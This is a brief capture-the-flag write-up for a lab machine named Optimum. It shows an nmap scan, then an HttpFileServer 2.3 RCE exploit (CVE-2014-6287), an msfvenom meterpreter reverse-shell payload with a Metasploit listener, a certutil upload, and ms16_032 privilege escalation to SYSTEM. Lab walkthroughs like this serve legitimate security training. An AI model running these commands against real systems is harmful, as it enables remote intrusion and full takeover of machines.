# Optimum

## Nmap scan:
```
Nmap scan report for 10.129.16.164
Host is up (0.014s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
|_http-title: HFS /
|_http-server-header: HFS 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

## Writeup:
Quick nmap scan reveals `HttpFileServer 2.3` running over port `80`.

This version is vulnerable to Remote Code Execution (RCE) through `CVE-2014-6287` (script included).
Exploiting this grants access to the system as `optimum\kostas` via the following command:
- `python3 CVE-2014-6287.py 10.129.16.164 80 10.10.15.217 9001`

The version of Windows Server is vulnerable to a privilege escalation vulnerability entitled
`ms16_032_secondary_logon`.

I try finding an `.exe` to exploit this, but the one I tried doesn't work, so I end up using metasploit. I first generate a payload using msfvenom, 
- `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.15.217 LPORT=9002 -f exe -o reverse.exe`
Then set up my listener with:
- `msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter_reverse_tcp; set lhost 10.10.15.217; set lport 9002; exploit"`
I then execute the `reverse.exe` uploaded via `certutil`.

This pops a meterpreter session, from where I am able to exploit `ms16_032_secondary_logon`, thus granting me access as `system`.

From there I grab the `root.txt` file in the administrator's home directory.

## Commands Used:
